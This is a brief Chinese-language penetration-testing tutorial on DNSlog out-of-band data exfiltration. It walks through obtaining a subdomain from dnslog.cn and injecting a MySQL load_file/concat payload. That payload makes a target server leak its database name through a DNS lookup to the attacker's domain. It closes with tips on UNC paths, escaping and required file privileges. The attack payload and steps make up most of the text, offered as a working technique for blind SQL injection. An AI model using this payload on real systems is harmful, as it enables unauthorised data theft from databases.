# DNSlog 渗透

DNSLog渗透是一种利用DNS（域名系统）协议进行攻击和信息收集的技术。其原理基于DNS协议的特性，即将域名解析为IP地址。攻击者可以创建一个恶意的DNS服务器，当受害者的计算机尝试解析特定的域名时，DNS服务器会记录请求，并将请求信息发送给攻击者，从而实现信息收集。

当我们发送给服务器的代码会执行但缺少回显的时候，dnslog 相当于给了我们一个回显的窗口。我们的目标就是，让目标服务器把我们的代码执行以后的返回值和域名连接起来，对指定域名进行访问从而留下痕迹。

1. 在 www.dnslog.cn 中搞一个域名，比如说这里搞到的是：sy119q.dnslog.cn

2. 构造 sql 语句：

3. ```sql
   select load_file(concat("//",(select database()),".sy119q.dnslog.cn/anyfile.txt"))
   ```

4. 注意：不要漏掉中间的 “.”，也不要忘了再最后加一个文件的名字。看到页面打着转转就知道大概率成功了，因为你的文件名是乱填的，它不可能找得到

5. 点击 dnslog 刷新按钮，即可看到目标服务器的请求



load_file() 既可以读取本机文件（看对方有没有放开这个权限），也可以读取互联网上的文件

似乎只能用于windows服务器上

双斜杠可以改成 4 个反斜杠

双反斜杠代表Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析，4 个反斜杠是因为考虑转义因素

需要打开文件读写权限